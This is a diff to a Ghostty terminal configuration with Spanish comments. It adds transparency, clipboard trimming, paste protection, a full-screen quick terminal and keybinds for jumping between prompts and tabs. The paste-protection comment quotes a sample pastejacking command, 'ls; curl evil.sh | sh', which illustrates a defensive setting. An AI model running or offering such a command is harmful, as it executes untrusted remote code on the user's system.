@@ -65,6 +65,14 @@ adjust-cell-height = 3%
 # aparte) · native (look macOS estándar) · hidden (sin titlebar).
 macos-titlebar-style = tabs
 
+# Transparencia sutil + blur fuerte. 0.95 deja apenas insinuar lo
+# que hay detrás sin perder contraste sobre Gruvbox Material Dark;
+# blur 20 difumina el fondo lo suficiente para que no distraiga del
+# output denso de Claude Code. Si querés más glass: bajar opacity a
+# 0.88 (medio) o 0.80 (marcado) y subir blur a 30-40.
+background-opacity = 0.95
+background-blur = 20
+
 # respira lateralmente — padding generoso para que el output denso
 # de Claude Code (tool calls, diffs, árboles) no se sienta apretado.
 window-padding-x = 22
@@ -93,6 +101,16 @@ cursor-style-blink = true
 # seleccionar ya copia (workflow rápido)
 copy-on-select = clipboard
 
+# Trim de espacios/newlines al final al copiar — evita el clásico
+# "pegué un comando y se ejecutó solo porque había \n al final".
+clipboard-trim-trailing-spaces = true
+
+# Paste protection — Ghostty te muestra confirm dialog si el texto
+# pegado contiene newlines o caracteres de control sospechosos
+# (typical attack: copiar "ls" de una web que en realidad es
+# "ls; curl evil.sh | sh\n"). Cost: un click extra ocasional.
+clipboard-paste-protection = true
+
 # ─── scrollback ───────────────────────────────────────────────
 # buffer grande para releer outputs largos
 scrollback-limit = 100000
@@ -108,7 +126,14 @@ mouse-hide-while-typing = true
 # ─── quick terminal (drop-down estilo Quake) ──────────────────
 # ⌥` te abre un terminal flotante encima de cualquier app para
 # checar algo sin perder el contexto de tu ventana principal.
+# Se cierra con la misma combinación pero el proceso sigue vivo
+# en background — ideal para tener tmux sessions persistentes
+# (claude, lazygit, REPLs) que reabrís al instante.
 quick-terminal-position = top
+# 100% = ocupa toda la pantalla (full-screen popup). Si en algún
+# momento querés volver al modo "drop-down chico" estilo Quake,
+# poné 40% o 50%.
+quick-terminal-size = 100%
 quick-terminal-animation-duration = 0.15
 keybind = global:alt+grave_accent=toggle_quick_terminal
 
@@ -183,6 +208,23 @@ keybind = cmd+shift+u=copy_url_to_clipboard
 
 # Cambia el título de la pestaña actual (útil para organizar SDD).
 keybind = cmd+shift+i=prompt_surface_title
+
+# Jump-to-prompt (requiere shell-integration, ya activo arriba).
+# Salta al prompt anterior/siguiente en el scrollback — clave para
+# releer outputs largos de Claude Code sin scrollear a mano.
+keybind = cmd+up=jump_to_prompt:-1
+keybind = cmd+down=jump_to_prompt:1
+
+# Tabs por número: ⌘1..⌘9 salta directo a esa tab.
+keybind = cmd+one=goto_tab:1
+keybind = cmd+two=goto_tab:2
+keybind = cmd+three=goto_tab:3
+keybind = cmd+four=goto_tab:4
+keybind = cmd+five=goto_tab:5
+keybind = cmd+six=goto_tab:6
+keybind = cmd+seven=goto_tab:7
+keybind = cmd+eight=goto_tab:8
+keybind = cmd+nine=goto_tab:9
 
 # ═══════════════════════════════════════════════════════════════
 #  PAQUETE 5 — Dock icon coordinado con Vesper
